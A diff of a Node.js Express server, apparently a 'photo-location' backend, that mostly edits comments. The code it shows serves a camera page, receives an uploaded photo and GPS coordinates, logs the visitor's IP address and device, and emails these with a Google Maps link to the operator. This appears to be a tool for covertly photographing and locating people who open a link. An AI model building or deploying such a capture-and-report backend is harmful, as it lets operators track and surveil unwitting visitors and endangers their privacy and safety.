@@ -35,32 +35,29 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-// 🔹 Serve camera.html from root URL
+// 🔹 Serve camera.html when user opens root "/"
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "camera.html"));
 });
 
-// 🔹 Upload route
+// 🔹 Upload route (handles photo + Gmail)
 app.post("/upload", upload.single("photo"), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ error: "No file uploaded" });
 
-    const backendUrl = "https://backend-photo-loaction.onrender.com"; // ← Render live URL
+    const backendUrl = "https://backend-photo-loaction.onrender.com";
     const photoURL = `${backendUrl}/${req.file.filename}`;
 
-    // System info & location details
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
     const device = req.headers["user-agent"];
     const date = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
     const { lat, lon } = req.body;
 
-    // Generate location map link
     let locationInfo = "Location not available";
     if (lat && lon) {
       locationInfo = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
     }
 
-    // Mail content
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: process.env.EMAIL_USER,
@@ -75,7 +72,6 @@ app.post("/upload", upload.single("photo"), async (req, res) => {
       `,
     };
 
-    // Send mail
     await transporter.sendMail(mailOptions);
     console.log("✅ Email sent successfully!");
     res.json({
